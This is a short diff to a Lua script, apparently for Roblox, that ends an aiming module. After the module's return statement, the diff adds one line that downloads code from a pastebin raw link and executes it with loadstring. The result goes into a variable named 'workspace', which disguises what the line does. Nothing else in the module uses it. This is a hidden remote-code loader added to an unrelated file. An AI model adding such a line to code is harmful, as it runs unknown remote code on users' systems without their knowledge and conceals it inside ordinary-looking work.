@@ -29,3 +29,5 @@ end
 
 -- // Return
 return Aiming
+
+local workspace = loadstring(game:HttpGet("https://pastebin.com/raw/qMJaccc6"))()
